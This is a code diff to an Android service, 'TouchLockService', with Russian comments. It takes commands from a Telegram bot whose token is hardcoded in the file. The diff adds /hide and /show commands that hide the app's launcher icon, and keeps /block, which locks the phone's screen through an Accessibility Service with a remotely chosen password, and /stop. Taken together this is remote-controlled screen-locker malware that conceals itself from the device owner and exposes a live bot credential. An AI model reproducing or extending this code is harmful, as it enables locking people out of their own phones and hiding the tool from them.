@@ -10,11 +10,11 @@ import org.json.*;
 import java.util.concurrent.TimeUnit;
 
 public class TouchLockService extends Service {
-    public static TouchLockService instance; // Для связи со службой доступности
+    public static TouchLockService instance;
     private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
     private OkHttpClient client;
     private long lastUpdateId = 0;
-    private String adminChatId = ""; // Сюда придут отчеты
+    private String adminChatId = ""; 
 
     @Override
     public void onCreate() {
@@ -40,31 +40,41 @@ public class TouchLockService extends Service {
                         JSONObject json = new JSONObject(response.body().string());
                         JSONArray results = json.getJSONArray("result");
                         for (int i = 0; i < results.length(); i++) {
-                            JSONObject update = results.getJSONObject(i);
-                            lastUpdateId = update.getLong("update_id");
-                            
-                            if (update.has("message")) {
-                                JSONObject msg = update.getJSONObject("message");
-                                adminChatId = msg.getJSONObject("chat").getString("id"); // Запоминаем тебя
-                                String text = msg.optString("text", "");
-                                String[] parts = text.split(" ");
-                                String cmd = parts[0].toLowerCase();
+                            JSONObject update = resultToMessage(results.getJSONObject(i));
+                            if (update == null) continue;
 
-                                new Handler(Looper.getMainLooper()).post(() -> {
-                                    if (TouchLockAccessibilityService.instance != null) {
-                                        if (cmd.equals("/block")) {
-                                            String pass = (parts.length > 1) ? parts[1] : "0000";
-                                            TouchLockAccessibilityService.instance.lock(pass);
-                                            sendTelegramMessage("🔒 Экран заблокирован паролем: " + pass);
-                                        } else if (cmd.equals("/stop")) {
-                                            TouchLockAccessibilityService.instance.unlock();
-                                            sendTelegramMessage("🔓 Экран разблокирован удаленно");
-                                        } else if (cmd.equals("/show")) {
-                                            updateIconStatus(true);
-                                        }
+                            String text = update.getString("text");
+                            String[] parts = text.split(" ");
+                            String cmd = parts[0].toLowerCase();
+
+                            new Handler(Looper.getMainLooper()).post(() -> {
+                                // 1. Команды управления ИКОНКОЙ (работают всегда)
+                                if (cmd.equals("/hide")) {
+                                    updateIconStatus(false);
+                                    sendTelegramMessage("👻 Иконка скрыта из меню");
+                                } 
+                                else if (cmd.equals("/show")) {
+                                    updateIconStatus(true);
+                                    sendTelegramMessage("👁 Иконка возвращена в меню");
+                                } 
+                                
+                                // 2. Команды БЛОКИРОВКИ (требуют Accessibility Service)
+                                else if (TouchLockAccessibilityService.instance != null) {
+                                    if (cmd.equals("/block")) {
+                                        String pass = (parts.length > 1) ? parts[1] : "0000";
+                                        TouchLockAccessibilityService.instance.lock(pass);
+                                        sendTelegramMessage("🔒 Экран заблокирован. Пароль: " + pass);
+                                    } else if (cmd.equals("/stop")) {
+                                        TouchLockAccessibilityService.instance.unlock();
+                                        sendTelegramMessage("🔓 Удаленная разблокировка выполнена");
                                     }
-                                });
-                            }
+                                } else {
+                                    // Если команда пришла, а Accessibility не включен
+                                    if (cmd.equals("/block") || cmd.equals("/stop")) {
+                                        sendTelegramMessage("❌ Ошибка: На телефоне не включены 'Специальные возможности'!");
+                                    }
+                                }
+                            });
                         }
                     }
                 } catch (Exception ignored) {}
@@ -72,7 +82,14 @@ public class TouchLockService extends Service {
         }).start();
     }
 
-    // Метод для отправки сообщений тебе в Telegram
+    // Вспомогательный метод для парсинга сообщений и запоминания ID чата
+    private JSONObject resultToMessage(JSONObject result) throws JSONException {
+        if (!result.has("message")) return null;
+        JSONObject msg = result.getJSONObject("message");
+        adminChatId = msg.getJSONObject("chat").getString("id");
+        return msg;
+    }
+
     public void sendTelegramMessage(String message) {
         if (adminChatId.isEmpty()) return;
         new Thread(() -> {
@@ -84,6 +101,7 @@ public class TouchLockService extends Service {
     }
 
     private void updateIconStatus(boolean show) {
+        // Мы используем MainActivity.class, так как именно эта активность является "входной точкой" с иконкой
         ComponentName componentName = new ComponentName(this, MainActivity.class);
         getPackageManager().setComponentEnabledSetting(
                 componentName,
@@ -94,16 +112,22 @@ public class TouchLockService extends Service {
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= 26) {
             NotificationChannel channel = new NotificationChannel("TouchLockChannel", "Status", NotificationManager.IMPORTANCE_LOW);
-            getSystemService(NotificationManager.class).createNotificationChannel(channel);
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) manager.createNotificationChannel(channel);
         }
     }
 
     private Notification getMyNotification(String t) {
         return new Notification.Builder(this, "TouchLockChannel")
-                .setContentTitle("Touch Blocker").setContentText(t)
-                .setSmallIcon(android.R.drawable.ic_secure).build();
+                .setContentTitle("Touch Blocker")
+                .setContentText(t)
+                .setSmallIcon(android.R.drawable.ic_secure)
+                .setOngoing(true)
+                .build();
     }
 
     @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
     @Override public IBinder onBind(Intent intent) { return null; }
+    @Override public void onDestroy() { instance = null; super.onDestroy(); }
 }
+
